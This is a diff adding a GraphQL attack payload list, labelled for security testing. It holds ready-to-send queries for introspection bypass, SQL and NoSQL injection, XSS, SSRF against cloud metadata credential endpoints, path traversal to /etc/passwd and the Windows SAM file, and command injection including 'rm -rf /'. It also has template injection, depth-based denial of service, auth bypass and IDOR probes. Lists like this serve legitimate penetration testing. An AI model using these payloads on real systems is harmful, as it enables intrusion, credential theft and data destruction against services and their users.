@@ -1,0 +1,236 @@
+# GraphQL Injection and Attack Payloads
+# Comprehensive list for GraphQL security testing
+# Categories: Introspection, Injection, DoS, Auth Bypass
+
+# =============================================================================
+# INTROSPECTION BYPASS PAYLOADS
+# =============================================================================
+
+# Standard introspection
+{"query": "{ __schema { types { name } } }"}
+{"query": "{ __schema { queryType { name } mutationType { name } } }"}
+{"query": "{ __type(name: \"User\") { name fields { name } } }"}
+
+# Aliased introspection
+{"query": "{ a: __schema { types { name } } }"}
+{"query": "{ schema: __schema { types { name } } }"}
+
+# Whitespace manipulation
+{"query": "{__schema{types{name}}}"}
+{"query": "{\n__schema\n{\ntypes\n{\nname\n}\n}\n}"}
+{"query": "{  __schema  {  types  {  name  }  }  }"}
+
+# With comments
+{"query": "{ #comment\n __schema { types { name } } }"}
+{"query": "{ __schema #inline\n { types { name } } }"}
+
+# Unicode bypass
+{"query": "{ \u005f\u005fschema { types { name } } }"}
+{"query": "{ \\u005f\\u005fschema { types { name } } }"}
+
+# Fragment-based
+{"query": "{ ...F } fragment F on Query { __schema { types { name } } }"}
+{"query": "query { ...SchemaFragment } fragment SchemaFragment on Query { __schema { queryType { name } } }"}
+
+# Operation name variations
+{"query": "query IntrospectionQuery { __schema { types { name } } }"}
+{"query": "query Q { __schema { types { name } } }"}
+{"operationName": "GetSchema", "query": "query GetSchema { __schema { types { name } } }"}
+
+# GET request format (URL encoded)
+?query={__schema{types{name}}}
+?query=%7B__schema%7Btypes%7Bname%7D%7D%7D
+
+# =============================================================================
+# SQL INJECTION IN VARIABLES
+# =============================================================================
+
+{"query": "query($id: ID!) { user(id: $id) { name } }", "variables": {"id": "1' OR '1'='1"}}
+{"query": "query($id: ID!) { user(id: $id) { name } }", "variables": {"id": "1' OR '1'='1'--"}}
+{"query": "query($id: ID!) { user(id: $id) { name } }", "variables": {"id": "1' OR '1'='1'#"}}
+{"query": "query($id: ID!) { user(id: $id) { name } }", "variables": {"id": "1 UNION SELECT * FROM users--"}}
+{"query": "query($id: ID!) { user(id: $id) { name } }", "variables": {"id": "1; DROP TABLE users;--"}}
+{"query": "query($id: ID!) { user(id: $id) { name } }", "variables": {"id": "1' AND SLEEP(5)--"}}
+{"query": "query($id: ID!) { user(id: $id) { name } }", "variables": {"id": "1' WAITFOR DELAY '0:0:5'--"}}
+{"query": "query($name: String!) { users(filter: {name: $name}) { id } }", "variables": {"name": "' OR 1=1--"}}
+{"query": "query($email: String!) { user(email: $email) { id } }", "variables": {"email": "admin'--@test.com"}}
+{"query": "query($search: String!) { products(search: $search) { id } }", "variables": {"search": "' UNION SELECT password FROM users--"}}
+
+# Blind SQL injection
+{"query": "query($id: ID!) { user(id: $id) { name } }", "variables": {"id": "1' AND (SELECT COUNT(*) FROM users)>0--"}}
+{"query": "query($id: ID!) { user(id: $id) { name } }", "variables": {"id": "1' AND SUBSTRING(username,1,1)='a'--"}}
+
+# =============================================================================
+# NOSQL INJECTION IN VARIABLES
+# =============================================================================
+
+{"query": "query($filter: JSON!) { users(filter: $filter) { id } }", "variables": {"filter": {"$ne": null}}}
+{"query": "query($filter: JSON!) { users(filter: $filter) { id } }", "variables": {"filter": {"$gt": ""}}}
+{"query": "query($filter: JSON!) { users(filter: $filter) { id } }", "variables": {"filter": {"$regex": ".*"}}}
+{"query": "query($filter: JSON!) { users(filter: $filter) { id } }", "variables": {"filter": {"$where": "1==1"}}}
+{"query": "query($id: ID!) { user(id: $id) { name } }", "variables": {"id": {"$gt": ""}}}
+{"query": "query($id: ID!) { user(id: $id) { name } }", "variables": {"id": {"$ne": -1}}}
+{"query": "query($search: String!) { search(q: $search) { id } }", "variables": {"search": {"$regex": "admin"}}}
+{"query": "mutation($input: JSON!) { update(input: $input) { id } }", "variables": {"input": {"$set": {"admin": true}}}}
+
+# MongoDB specific
+{"query": "query($id: ID!) { user(id: $id) { name } }", "variables": {"id": {"$oid": "000000000000000000000000"}}}
+{"query": "query($filter: JSON!) { users(filter: $filter) { id } }", "variables": {"filter": {"password": {"$exists": true}}}}
+
+# =============================================================================
+# XSS IN VARIABLES
+# =============================================================================
+
+{"query": "mutation($content: String!) { createPost(content: $content) { id } }", "variables": {"content": "<script>alert(1)</script>"}}
+{"query": "mutation($name: String!) { updateProfile(name: $name) { id } }", "variables": {"name": "<img src=x onerror=alert(1)>"}}
+{"query": "mutation($bio: String!) { updateUser(bio: $bio) { id } }", "variables": {"bio": "<svg onload=alert(document.cookie)>"}}
+{"query": "mutation($title: String!) { createArticle(title: $title) { id } }", "variables": {"title": "Test\"><script>alert(1)</script>"}}
+{"query": "mutation($comment: String!) { addComment(text: $comment) { id } }", "variables": {"comment": "javascript:alert(1)"}}
+{"query": "mutation($url: String!) { setAvatar(url: $url) { id } }", "variables": {"url": "javascript:alert(document.domain)"}}
+
+# =============================================================================
+# SSRF IN VARIABLES
+# =============================================================================
+
+{"query": "query($url: String!) { fetchUrl(url: $url) { content } }", "variables": {"url": "http://localhost"}}
+{"query": "query($url: String!) { fetchUrl(url: $url) { content } }", "variables": {"url": "http://127.0.0.1"}}
+{"query": "query($url: String!) { fetchUrl(url: $url) { content } }", "variables": {"url": "http://[::1]"}}
+{"query": "query($url: String!) { fetchUrl(url: $url) { content } }", "variables": {"url": "http://0.0.0.0"}}
+{"query": "query($url: String!) { fetchUrl(url: $url) { content } }", "variables": {"url": "http://169.254.169.254/latest/meta-data/"}}
+{"query": "query($url: String!) { fetchUrl(url: $url) { content } }", "variables": {"url": "http://metadata.google.internal/computeMetadata/v1/"}}
+{"query": "mutation($avatar: String!) { updateAvatar(url: $avatar) { id } }", "variables": {"avatar": "file:///etc/passwd"}}
+{"query": "query($webhook: String!) { test(url: $webhook) { status } }", "variables": {"webhook": "http://localhost:6379"}}
+{"query": "query($url: String!) { import(source: $url) { data } }", "variables": {"url": "gopher://localhost:6379/_INFO"}}
+
+# Cloud metadata endpoints
+{"query": "query($url: String!) { fetch(url: $url) { body } }", "variables": {"url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/"}}
+{"query": "query($url: String!) { fetch(url: $url) { body } }", "variables": {"url": "http://169.254.170.2/v2/credentials"}}
+
+# =============================================================================
+# PATH TRAVERSAL IN VARIABLES
+# =============================================================================
+
+{"query": "query($file: String!) { readFile(path: $file) { content } }", "variables": {"file": "../../../etc/passwd"}}
+{"query": "query($file: String!) { readFile(path: $file) { content } }", "variables": {"file": "....//....//....//etc/passwd"}}
+{"query": "query($file: String!) { readFile(path: $file) { content } }", "variables": {"file": "..%2f..%2f..%2fetc%2fpasswd"}}
+{"query": "query($template: String!) { render(template: $template) { html } }", "variables": {"template": "/etc/passwd"}}
+{"query": "query($image: String!) { getImage(path: $image) { data } }", "variables": {"image": "..\\..\\..\\windows\\system32\\config\\sam"}}
+{"query": "mutation($file: String!) { upload(path: $file) { success } }", "variables": {"file": "../../../var/www/shell.php"}}
+
+# =============================================================================
+# COMMAND INJECTION IN VARIABLES
+# =============================================================================
+
+{"query": "mutation($cmd: String!) { execute(command: $cmd) { output } }", "variables": {"cmd": "; cat /etc/passwd"}}
+{"query": "query($host: String!) { ping(host: $host) { result } }", "variables": {"host": "localhost; id"}}
+{"query": "query($domain: String!) { lookup(domain: $domain) { ip } }", "variables": {"domain": "test.com; whoami"}}
+{"query": "mutation($name: String!) { convert(filename: $name) { path } }", "variables": {"name": "test.pdf; rm -rf /"}}
+{"query": "query($input: String!) { process(data: $input) { result } }", "variables": {"input": "$(cat /etc/passwd)"}}
+{"query": "query($cmd: String!) { shell(command: $cmd) { output } }", "variables": {"cmd": "| ls -la"}}
+{"query": "mutation($file: String!) { compress(name: $file) { url } }", "variables": {"file": "`id`"}}
+
+# =============================================================================
+# SSTI IN VARIABLES
+# =============================================================================
+
+{"query": "query($name: String!) { greet(name: $name) { message } }", "variables": {"name": "{{7*7}}"}}
+{"query": "query($template: String!) { render(template: $template) { html } }", "variables": {"template": "${7*7}"}}
+{"query": "mutation($content: String!) { format(text: $content) { result } }", "variables": {"content": "<%= 7*7 %>"}}
+{"query": "query($msg: String!) { display(message: $msg) { output } }", "variables": {"msg": "{{config}}"}}
+{"query": "query($data: String!) { process(input: $data) { result } }", "variables": {"data": "{{''.__class__.__mro__[1].__subclasses__()}}"}}
+{"query": "mutation($text: String!) { preview(content: $text) { html } }", "variables": {"text": "#{7*7}"}}
+
+# =============================================================================
+# DEPTH/COMPLEXITY ATTACK QUERIES
+# =============================================================================
+
+{"query": "{ user { posts { comments { author { posts { comments { author { id } } } } } } } }"}
+{"query": "{ users { friends { friends { friends { friends { friends { id } } } } } } }"}
+{"query": "{ node { children { children { children { children { children { id } } } } } } }"}
+{"query": "{ a: __typename b: __typename c: __typename d: __typename e: __typename f: __typename g: __typename h: __typename i: __typename j: __typename }"}
+
+# =============================================================================
+# BATCH/ALIAS ATTACK QUERIES
+# =============================================================================
+
+[{"query": "{ __typename }"},{"query": "{ __typename }"},{"query": "{ __typename }"}]
+{"query": "{ a1: __schema { types { name } } a2: __schema { types { name } } a3: __schema { types { name } } }"}
+{"query": "{ q1: user(id: \"1\") { id } q2: user(id: \"2\") { id } q3: user(id: \"3\") { id } }"}
+
+# =============================================================================
+# FIELD SUGGESTION/ENUMERATION
+# =============================================================================
+
+{"query": "{ user { passwor } }"}
+{"query": "{ user { secre } }"}
+{"query": "{ user { admi } }"}
+{"query": "{ user { toke } }"}
+{"query": "{ user { apiKe } }"}
+{"query": "{ user { creditCar } }"}
+{"query": "{ user { ss } }"}
+{"query": "{ users { passwordHas } }"}
+{"query": "{ admin { user } }"}
+{"query": "{ internal { confi } }"}
+{"query": "{ debug { inf } }"}
+{"query": "{ system { secre } }"}
+{"query": "{ config { databas } }"}
+
+# =============================================================================
+# AUTH BYPASS QUERIES
+# =============================================================================
+
+{"query": "{ currentUser { id email role isAdmin } }"}
+{"query": "{ adminUsers { id email } }"}
+{"query": "{ allUsers { id email passwordHash } }"}
+{"query": "mutation { deleteUser(id: \"1\") { success } }"}
+{"query": "mutation { updateRole(userId: \"1\", role: \"admin\") { success } }"}
+{"query": "mutation { createAdmin(email: \"attacker@evil.com\") { id } }"}
+{"query": "query($admin: Boolean!) { user { id @skip(if: $admin) adminData @include(if: $admin) } }", "variables": {"admin": true}}
+{"query": "{ user(id: \"admin\") { secrets } }"}
+{"query": "mutation { resetPassword(email: \"admin@target.com\") { token } }"}
+
+# =============================================================================
+# IDOR QUERIES
+# =============================================================================
+
+{"query": "{ user(id: \"1\") { id email privateData } }"}
+{"query": "{ user(id: \"2\") { id email secrets } }"}
+{"query": "{ user(id: \"0\") { id email } }"}
+{"query": "{ user(id: \"-1\") { id email } }"}
+{"query": "{ user(id: \"999999\") { id email } }"}
+{"query": "{ order(id: \"1\") { id total items customer { email } } }"}
+{"query": "{ document(id: \"1\") { content owner permissions } }"}
+{"query": "{ invoice(id: \"INV-001\") { amount customer paymentDetails } }"}
+{"query": "query($ids: [ID!]!) { users(ids: $ids) { id email } }", "variables": {"ids": ["1","2","3","4","5","6","7","8","9","10"]}}
+{"query": "{ messages(conversationId: \"1\") { content sender } }"}
+
+# =============================================================================
+# DIRECTIVE ABUSE
+# =============================================================================
+
+{"query": "{ user { id @deprecated email @skip(if: false) } }"}
+{"query": "{ user { id @include(if: true) @skip(if: false) @deprecated } }"}
+{"query": "query @cached { user { id } }"}
+{"query": "mutation @async { createUser(name: \"test\") { id } }"}
+
+# =============================================================================
+# SUBSCRIPTION ABUSE
+# =============================================================================
+
+{"query": "subscription { newMessages { content sender } }"}
+{"query": "subscription { userUpdates { id email passwordHash } }"}
+{"query": "subscription { adminEvents { type data } }"}
+{"query": "subscription { allEvents { type payload } }"}
+
+# =============================================================================
+# PERSISTED QUERY ATTACKS
+# =============================================================================
+
+{"extensions": {"persistedQuery": {"version": 1, "sha256Hash": "0000000000000000000000000000000000000000000000000000000000000000"}}}
+{"extensions": {"persistedQuery": {"version": 1, "sha256Hash": ""}}, "query": "{ __schema { types { name } } }"}
+
+# =============================================================================
+# APQ (Automatic Persisted Queries) BYPASS
+# =============================================================================
+
+{"query": null, "extensions": {"persistedQuery": {"version": 1, "sha256Hash": "ecf4edb46db40b5132295c0291d62fb65d6759a9eedfa4d5d612dd5ec54a6b38"}}}
